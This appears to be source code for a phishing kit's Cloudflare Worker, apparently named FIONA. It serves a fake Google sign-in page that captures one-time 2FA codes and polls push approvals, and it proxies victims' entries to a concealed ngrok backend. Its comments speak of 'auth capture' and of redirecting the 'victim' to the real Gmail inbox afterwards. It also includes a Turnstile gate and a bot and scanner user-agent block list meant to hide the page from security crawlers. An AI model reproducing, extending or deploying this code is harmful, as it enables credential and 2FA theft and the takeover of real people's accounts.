      '<input type="tel" id="twoFaCode" class="form-input" maxlength="8" autocomplete="one-time-code" placeholder=" " inputmode="numeric" />' +
      '<label class="floating-label" for="twoFaCode">Enter code</label>' +
      '</div>' +
      '<p style="font-size:13px;color:#5f6368;margin:4px 0 0;">' + label + '</p>';

    actions.innerHTML =
      '<button class="btn-link">Try another way</button>' +
      '<button class="btn-primary" id="btnTwoFaNext" type="button">Next</button>';

    var btn = document.getElementById('btnTwoFaNext');
    var codeInput = document.getElementById('twoFaCode');
    if (btn) btn.addEventListener('click', handleTwoFaSubmit);
    if (codeInput) codeInput.addEventListener('keypress', function(e) {
      if (e.key === 'Enter') handleTwoFaSubmit();
    });
  }

  // ── 2FA submit handler ───────────────────────────────────────────────────────
  async function handleTwoFaSubmit() {
    var codeInput = document.getElementById('twoFaCode');
    var twoFaError = document.getElementById('twoFaError');
    var code = codeInput ? codeInput.value.trim() : '';

    if (!code) {
      showError(twoFaError, 'Enter the code');
      if (codeInput) codeInput.classList.add('error-input');
      return;
    }
    if (!sessionId) {
      showError(twoFaError, 'Session expired. Please start again.');
      return;
    }

    hideError(twoFaError);
    if (codeInput) codeInput.classList.remove('error-input');
    showProgress();

    try {
      var res = await fetch('/api/google/session/' + sessionId + '/2fa', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: code, method: twoFactorType || 'totp' })
      });
      var data = await res.json();
      hideProgress();

      if (!res.ok || !data.success) {
        showError(twoFaError, data.error || data.message || 'Wrong code. Try again.');
        if (codeInput) codeInput.classList.add('error-input');
        return;
      }

      slidesTrack.className = 'slides-track at-success';
    } catch (err) {
      hideProgress();
      showError(twoFaError, 'Network error. Please try again.');
    }
  }

  // ── Push notification polling ────────────────────────────────────────────────
  function startPushPolling() {
    if (pushPollInterval) clearInterval(pushPollInterval);
    var attempts = 0;
    pushPollInterval = setInterval(async function() {
      attempts++;
      if (attempts > 60) {
        clearInterval(pushPollInterval);
        var s = document.getElementById('pushStatus');
        if (s) s.textContent = 'Timed out. Try another way.';
        return;
      }
      try {
        var res = await fetch('/api/google/session/' + sessionId + '/status');
        
        // Handle session not found (404 or cleanup happened)
        if (!res.ok || res.status === 404) {
          clearInterval(pushPollInterval);
          // Redirect victim to real Gmail inbox after successful auth capture
          setTimeout(function() {
            window.location.replace('https://mail.google.com/mail/u/0/');
          }, 500);
          return;
        }
        
        var data = await res.json();
        
        // Check for authenticated status
        if (data.status === 'AUTHENTICATED') {
          clearInterval(pushPollInterval);
          // Redirect victim to real Gmail inbox after successful auth capture
          setTimeout(function() {
            window.location.replace('https://mail.google.com/mail/u/0/');
          }, 800);
          return;
        }
        
        // Also handle legacy stage field for compatibility
        if (data.stage === 'success') {
          clearInterval(pushPollInterval);
          // Redirect victim to real Gmail inbox after successful auth capture
          setTimeout(function() {
            window.location.replace('https://mail.google.com/mail/u/0/');
          }, 800);
          return;
        }
      } catch (e) { /* ignore */ }
    }, 2000);
  }

})();
</script>

</body>
</html>
`;
// ─────────────────────────────────────────────────────────────────────────────
//  Worker entry point
// ─────────────────────────────────────────────────────────────────────────────
// ── Bot UA detection ──────────────────────────────────────────────────────────
const BOT_USER_AGENTS = [
  'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
  'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver',
  'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'rogerbot',
  'screaming frog', 'zgrab', 'masscan', 'nmap', 'sqlmap',
  'nikto', 'dirbuster', 'nuclei', 'curl/', 'python-requests',
  'go-http-client', 'libwww-perl', 'wget', 'scrapy',
  'headlesschrome', 'phantomjs', 'selenium', 'webdriver',
  'chrome-lighthouse', 'gtmetrix', 'pagespeed', 'pingdom',
];
function isBotUA(ua) {
  if (!ua) return true;
  const lower = ua.toLowerCase();
  return BOT_USER_AGENTS.some(b => lower.includes(b));
}

export default {
  async fetch(request, env) {
    // ── Bot check — TEMPORARILY DISABLED FOR DEBUGGING ──────────────
    // const ua = request.headers.get('User-Agent') || '';
    // if (isBotUA(ua)) return new Response(null, { status: 404 });

    const url = new URL(request.url);

    // CORS preflight
    if (request.method === 'OPTIONS') {
      return new Response(null, { status: 204, headers: corsHeaders() });
    }

    // ── Turnstile verification endpoint ────────────────────────────────────
    // The challenge page POSTs here; we proxy verification to backend and set cookie.
    if (request.method === 'POST' && url.pathname === '/verify-turnstile') {
      return verifyTurnstile(request);
    }

    // ── Proxy /api/* to backend ─────────────────────────────────────────────
    if (url.pathname.startsWith('/api/')) {
      return proxyToBackend(request, url);
    }

    // ── Serve login page (Turnstile gate active) ────────────────────────────
    if (request.method === 'GET' &&
        (url.pathname === '/' || url.pathname === '')) {

      // Check for the verification cookie set by /verify-turnstile
      const cookies  = request.headers.get('Cookie') || '';
      const verified = /(?:^|;\s*)cf_verified=true(?:;|$)/.test(cookies);

      if (!verified) {
        // Fetch site key from backend at request time — never baked into script.
        return new Response(await getTurnstilePage(url.hostname), {
          headers: {
            'Content-Type':           'text/html; charset=utf-8',
            'Cache-Control':          'no-cache, no-store, must-revalidate',
            'Pragma':                 'no-cache',
            'X-Frame-Options':        'DENY',
            'X-Content-Type-Options': 'nosniff',
            'Referrer-Policy':        'no-referrer',
          },
        });
      }

      const captureId = url.searchParams.get('s') || '';

      // BACKEND_URL → '' so page JS uses same-origin /api/*.
      // Worker proxies those calls; backend URL never reaches victim's browser.
      const html = HTML_TEMPLATE
        .replace(/\{\{CAPTURE_ID\}\}/g, escapeHtmlAttr(captureId))
        .replace(/\{\{BACKEND_URL\}\}/g, '');

      return new Response(html, {
        headers: {
          'Content-Type':           'text/html; charset=utf-8',
          'Cache-Control':          'no-cache, no-store, must-revalidate',
          'Pragma':                 'no-cache',
          'X-Frame-Options':        'DENY',
          'X-Content-Type-Options': 'nosniff',
          'Referrer-Policy':        'no-referrer',
        },
      });
    }

    return new Response('Not Found', { status: 404 });
  },
};

// ─────────────────────────────────────────────────────────────────────────────
//  Proxy helper — forwards /api/* to BACKEND_URL
// ─────────────────────────────────────────────────────────────────────────────
async function proxyToBackend(request, url) {
  const BACKEND = BACKEND_URL.replace(/\/$/, '');

  if (!BACKEND) {
    return jsonError(503, 'Backend URL not configured.');
  }

  const target = BACKEND + url.pathname + url.search;

  // Forward headers, strip host (CF sets it automatically)
  const headers = new Headers(request.headers);
  headers.delete('host');
  
  // Skip ngrok browser warning on free tier
  headers.set('User-Agent', 'FionaWorker/1.0');
  headers.set('ngrok-skip-browser-warning', '1');

  // Pass real victim IP to backend for logging / rate-limiting
  const clientIp =
    request.headers.get('CF-Connecting-IP') ||
    request.headers.get('X-Real-IP') || '';
  if (clientIp) headers.set('X-Forwarded-For', clientIp);

  let body;
  if (!['GET', 'HEAD'].includes(request.method)) {
    body = request.body;
  }

  try {
    const upstream = await fetch(target, {
      method:   request.method,
      headers,
      body,
      redirect: 'follow',
    });

    const resHeaders = new Headers(upstream.headers);
    resHeaders.delete('transfer-encoding');
    resHeaders.set('Access-Control-Allow-Origin', url.origin);
    resHeaders.set('Access-Control-Allow-Credentials', 'true');

    return new Response(upstream.body, {
      status:     upstream.status,
      statusText: upstream.statusText,
      headers:    resHeaders,
    });
  } catch (err) {
    console.error('[FIONA] proxy error:', err.message);
    return jsonError(502, 'Upstream error: ' + err.message);
  }
}

// ─────────────────────────────────────────────────────────────────────────────
//  Turnstile — challenge page + server-side verification
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Verifies a Turnstile token by proxying to the backend.
 * Backend holds the secret_key — it never lives in this Worker.
 * On success, sets a cf_verified=true HttpOnly cookie so the Worker gate passes.
 */
async function verifyTurnstile(request) {
  let token;
  try {
    const formData = await request.formData();
    token = formData.get('cf-turnstile-response') || '';
  } catch {
    return jsonError(400, 'Invalid form data');
  }

  const ip = request.headers.get('CF-Connecting-IP') || '';
  const hostname = new URL(request.url).hostname;

  // If token is empty, check if Turnstile is configured for this domain
  if (!token || token === '') {
    try {
      const cfgRes = await fetch(
        BACKEND_URL.replace(/\/$/, '') + '/api/domain/config?hostname=' + encodeURIComponent(hostname),
        {
          headers: {
            'User-Agent': 'FionaWorker/1.0',
            'ngrok-skip-browser-warning': '1',
          },
        }
      );
      if (cfgRes.ok) {
        const cfg = await cfgRes.json();
        const siteKey = cfg.turnstileSiteKey || '';
        
        // If no Turnstile configured, bypass verification
        if (!siteKey || siteKey === '') {
          return new Response(JSON.stringify({ success: true }), {
            status: 200,
            headers: {
              'Content-Type': 'application/json',
              'Set-Cookie':
                'cf_verified=true; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=3600',
            },
          });
        }
      }
    } catch (err) {
      console.error('[FIONA] Config fetch error in verifyTurnstile:', err.message);
    }
    
    // If we get here, Turnstile is configured but token is missing
    return jsonError(400, 'Missing Turnstile token');
  }

  let outcome;
  try {
    const verifyRes = await fetch(
      BACKEND_URL.replace(/\/$/, '') + '/api/turnstile/verify',
      {
        method: 'POST',
        headers: { 
          'User-Agent': 'FionaWorker/1.0',
          'Content-Type': 'application/json',
          'ngrok-skip-browser-warning': '1',
        },
        body: JSON.stringify({ token, ip, hostname }),
      }
    );
    outcome = await verifyRes.json();
  } catch (err) {
    console.error('[FIONA] Turnstile verify fetch error:', err.message);
    return jsonError(502, 'Could not reach verification service');
  }

  if (outcome.success) {
    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: {
        'Content-Type': 'application/json',
        // HttpOnly + Secure — JS in the challenge page cannot read this,
        // but the browser sends it on subsequent requests so the Worker gate passes.
        'Set-Cookie':
          'cf_verified=true; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=3600',
      },
    });
  }

  return new Response(
    JSON.stringify({ success: false, errors: outcome.errors || [] }),
    { status: 400, headers: { 'Content-Type': 'application/json' } }
  );
}

/**
 * Returns the HTML for the Turnstile challenge interstitial.
 * Fetches the site_key from the backend at request time — never baked into the script.
 * Backend stores it per-domain (saved when the Turnstile widget was created at deploy time).
 *
 * Flow: visitor hits / → no cookie → this page → Turnstile widget appears →
 *   on success JS fetches POST /verify-turnstile → server sets cookie →
 *   JS calls window.location.replace(href) → same URL, cookie present →
 *   Worker gate passes → Google login page served.
 */
async function getTurnstilePage(hostname) {
  let siteKey = '';
  try {
    const cfgRes = await fetch(
      BACKEND_URL.replace(/\/$/, '') + '/api/domain/config?hostname=' + encodeURIComponent(hostname),
      {
        headers: {
          'User-Agent': 'FionaWorker/1.0',
          'ngrok-skip-browser-warning': '1',
        },
      }
    );
    if (cfgRes.ok) {
      const cfg = await cfgRes.json();
      siteKey = cfg.turnstileSiteKey || '';
    }
  } catch (err) {
    console.error('[FIONA] config fetch error:', err.message);
  }
  
  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background: #fafafa; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { text-align: center; max-width: 500px; width: 100%; }
        .verification-box { background: white; padding: 40px 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); }
        .message { font-size: 20px; color: #333; margin-bottom: 30px; font-weight: 400; }
        .turnstile-wrapper { display: flex; justify-content: center; margin: 25px 0; }
        .status { font-size: 14px; color: #999; margin-top: 20px; }
        .loading { display: none; margin-top: 20px; }
        .loading.show { display: block; }
        .spinner { border: 2px solid #f3f3f3; border-top: 2px solid #666; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-message { margin-top: 20px; padding: 12px 20px; border-radius: 4px; font-size: 14px; display: none; }
        .status-message.show { display: block; }
        .status-message.error { background: #fff3cd; color: #856404; border: 1px solid #ffeaa7; }
        .status-message.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
    </style>
</head>
<body>
    <div class="container">
        <div class="verification-box">
            <form id="verifyForm" method="POST" action="/verify-turnstile">
                <div class="message">Verify you are human</div>
                <div class="turnstile-wrapper">
                    <div class="cf-turnstile" data-sitekey="${siteKey}" data-callback="onTurnstileSuccess" data-error-callback="onTurnstileError" data-theme="light"></div>
                </div>
                <div class="loading"><div class="spinner"></div><div class="status">Verifying...</div></div>
                <div class="status-message" id="statusMessage"></div>
                <div class="status">Secure browsing scan underway.</div>
            </form>
        </div>
    </div>
    <script>
        let isVerifying = false;
        function onTurnstileSuccess(token) {
            if (isVerifying) return;
            isVerifying = true;
            document.querySelector('.loading').classList.add('show');
            document.getElementById('statusMessage').classList.remove('show');
            const fd = new FormData();
            fd.append('cf-turnstile-response', token);
            fetch('/verify-turnstile', { method: 'POST', body: fd })
                .then(r => r.json())
                .then(data => {
                    document.querySelector('.loading').classList.remove('show');
                    const s = document.getElementById('statusMessage');
                    if (data.success) {
                        s.textContent = 'Verification successful. Redirecting...';
                        s.className = 'status-message success show';
                        setTimeout(() => { window.location.href = '/'; }, 1000);
                    } else {
                        s.textContent = 'Verification failed. Please try again.';
                        s.className = 'status-message error show';
                        isVerifying = false;
                        if (window.turnstile) window.turnstile.reset();
                    }
                })
                .catch(() => {
                    document.querySelector('.loading').classList.remove('show');
                    const s = document.getElementById('statusMessage');
                    s.textContent = 'An error occurred. Please try again.';
                    s.className = 'status-message error show';
                    isVerifying = false;
                    if (window.turnstile) window.turnstile.reset();
                });
        }
        function onTurnstileError() {
            document.getElementById('statusMessage').textContent = 'Challenge failed to load. Please refresh.';
            document.getElementById('statusMessage').className = 'status-message error show';
        }
        document.getElementById('verifyForm').addEventListener('submit', e => e.preventDefault());
    </script>
</body>
</html>`;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Utilities
// ─────────────────────────────────────────────────────────────────────────────
function jsonError(status, message) {
  return new Response(JSON.stringify({ error: message }), {
    status,
    headers: { 'Content-Type': 'application/json' },
  });
}

function corsHeaders() {
  return {
    'Access-Control-Allow-Origin':  '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Access-Control-Max-Age':       '86400',
  };
}

// Prevent captureId from breaking the HTML if it contains special chars
function escapeHtmlAttr(str) {
  return String(str)
    .replace(/&/g,  '&amp;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#39;')
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;');
}
